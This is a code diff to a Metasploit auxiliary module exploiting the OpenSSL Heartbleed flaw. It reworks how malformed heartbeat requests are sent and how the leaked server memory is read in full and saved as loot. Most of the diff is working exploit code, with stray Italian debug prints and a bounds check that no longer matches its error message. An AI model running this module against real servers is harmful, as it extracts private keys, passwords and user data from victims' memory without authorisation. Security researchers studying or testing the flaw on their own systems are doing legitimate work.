@@ -130,14 +130,13 @@ class Metasploit3 < Msf::Auxiliary
     register_advanced_options(
       [
         OptInt.new('HEARTBEAT_LENGTH', [true, 'Heartbeat length', 65535]),
-        OptInt.new('HEARTBEAT_LIMIT', [true, 'The number of kilobytes of data to capture at most from server', 64*1024]),
         OptString.new('XMPPDOMAIN', [ true, 'The XMPP Domain to use when Jabber is selected', 'localhost' ])
       ], self.class)
 
   end
 
   def run
-    if heartbeat_length > 65535 || heartbeat_length < 4073
+    if heartbeat_length > 65535 || heartbeat_length < 0
       print_error("HEARTBEAT_LENGTH should be a natural number bigger than 4073 and less than 65536")
       return
     end
@@ -147,10 +146,6 @@ class Metasploit3 < Msf::Auxiliary
 
   def heartbeat_length
     datastore["HEARTBEAT_LENGTH"]
-  end
-
-  def heartbeat_limit
-    datastore['HEARTBEAT_LIMIT'].to_i * 1024
   end
 
   def peer
@@ -253,26 +248,59 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
+    vprint_status("#{peer} - Sending Heartbeat...")
+    sock.put(heartbeat(heartbeat_length))
 
-#    heartbeat_data = send_heartbeat(sock)
-#    while(heartbeat_data && heartbeat_data.length < 131071)
-#      heartbeat_data << send_heartbeat(sock)
-#    end
+    hdr = sock.get_once(5)
+    if hdr.blank?
+      vprint_error("#{peer} - No Heartbeat response...")
+      return
+    end
 
-    heartbeat_data = send_heartbeat
-    if heartbeat_data
-      loop do
-        res = send_heartbeat
-        if res            
-          heartbeat_data << res
-        end
-        print_status("Voglio estrarre #{heartbeat_limit} bytes")
-        break if (!res || heartbeat_data.length > heartbeat_limit)
+    unpacked = hdr.unpack('Cnn')
+    type = unpacked[0]
+    version = unpacked[1] # must match the type from client_hello
+    len = unpacked[2]
+
+    # try to get the TLS error
+    if type == ALERT_RECORD_TYPE
+      res = sock.get_once(len)
+      alert_unp = res.unpack('CC')
+      alert_level = alert_unp[0]
+      alert_desc = alert_unp[1]
+      msg = "Unknown error"
+      # http://tools.ietf.org/html/rfc5246#section-7.2
+      case alert_desc
+      when 0x46
+        msg = "Protocol error. Looks like the chosen protocol is not supported."
       end
+      vprint_error("#{peer} - #{msg}")
+      disconnect
+      return
+    end
+
+    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
+      vprint_error("#{peer} - Unexpected Heartbeat response")
+      disconnect
+      return
+    end
+
+    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
+
+    # Read the magic length...no endless loop here as we have sock timeout
+    begin
+      heartbeat_data = sock.get_once(heartbeat_length)
+      while(heartbeat_data.length < heartbeat_length)
+print_status("Letto #{heartbeat_data.length} Dentro il while devo ancora leggere #{heartbeat_length - heartbeat_data.length}") 
+        heartbeat_data << sock.get_once(heartbeat_length - heartbeat_data.length)
+      end
+    rescue
+      vprint_error("#{peer} - Looks like we got some problem while reading from socket...")
+print_error("#{peer} - Looks like we got some problem while reading from socket...")
     end
 
     if heartbeat_data
-      print_good("#{peer} - Heartbeat response with leak")
+      print_good("#{peer} - Heartbeat response with leak - Requested #{heartbeat_length} bytes, leaked #{heartbeat_data.length} bytes")
       report_vuln({
         :host => rhost,
         :port => rport,
@@ -286,6 +314,7 @@ class Metasploit3 < Msf::Auxiliary
           match_data = heartbeat_data.scan(pattern).join
         else
           match_data = heartbeat_data
+        end
         path = store_loot(
           "openssl.heartbleed.server",
           "application/octet-stream",
@@ -294,7 +323,7 @@ class Metasploit3 < Msf::Auxiliary
           nil,
           "OpenSSL Heartbleed server memory"
         )
-        print_status("#{peer} - Heartbeat data stored in #{path}")
+        print_status("#{peer} - Heartbeat data stored in #{path} - Requested #{heartbeat_length} bytes, leaked #{heartbeat_data.length} bytes")
       end
       vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
     else
@@ -305,7 +334,6 @@ class Metasploit3 < Msf::Auxiliary
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
     payload << [length].pack("n") # Payload Length: 65535
-    payload << 'a'* 4096
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
 
@@ -342,59 +370,4 @@ class Metasploit3 < Msf::Auxiliary
     record << data
   end
 
-  def send_heartbeat
-    vprint_status("#{peer} - Sending Heartbeat...")
-    sock.put(heartbeat(heartbeat_length))
-print_status("#{peer} - SENT Heartbeat...")
-
-    hdr = sock.get_once(5)
-    if hdr.blank?
-      vprint_error("#{peer} - No Heartbeat response...")
-      return nil
-    end
-
-print_status("#{peer} - Unpacking header")
-
-    unpacked = hdr.unpack('Cnn')
-    type = unpacked[0]
-    version = unpacked[1] # must match the type from client_hello
-    len = unpacked[2]
-
-    # try to get the TLS error
-    if type == ALERT_RECORD_TYPE
-      res = sock.get_once(len)
-      alert_unp = res.unpack('CC')
-      alert_level = alert_unp[0]
-      alert_desc = alert_unp[1]
-      msg = "Unknown error"
-      # http://tools.ietf.org/html/rfc5246#section-7.2
-      case alert_desc
-      when 0x46
-        msg = "Protocol error. Looks like the chosen protocol is not supported."
-      end
-      vprint_error("#{peer} - #{msg}")
-      disconnect
-
-      return nil
-    end
-print_status("#{peer} - BOOOOH")
-    unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
-      vprint_error("#{peer} - Unexpected Heartbeat response")
-      disconnect
-      return nil
-
-    end
-    print_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-
-    # Read the magic length...
-    dummy_data = sock.get_once(heartbeat_length)
-    print_status("Got data...")
-    loop do
-      print_status("Got other data...")
-      dummy_data << sock.get_once(heartbeat_length)
-      break if dummy_data.length >= heartbeat_length
-    end
-    return dummy_data
-  end
 end
